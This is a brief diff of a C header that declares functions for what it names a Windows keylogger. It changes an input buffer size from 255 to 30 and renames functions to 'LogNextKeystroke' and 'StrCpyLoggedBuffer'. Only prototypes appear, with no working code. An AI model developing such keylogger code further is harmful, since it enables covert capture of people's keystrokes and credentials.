@@ -16,13 +16,13 @@
 
 
 
-#define INPUT_BUFFER_SIZE 255
+#define INPUT_BUFFER_SIZE 30
 
 void StartWinKeylogger(void);
 void RemoveWinKeylogger(void);
-BOOL ReadNextCharToInputBuffer(size_t *buff_len);
+BOOL LogNextKeystroke(size_t *buff_len);
 BOOL StrCmpInputBuffer(WCHAR *szBuff);
-void StrCpyFullBuffer(WCHAR *szBuff);
+void StrCpyLoggedBuffer(WCHAR *szBuff);
 
 
 
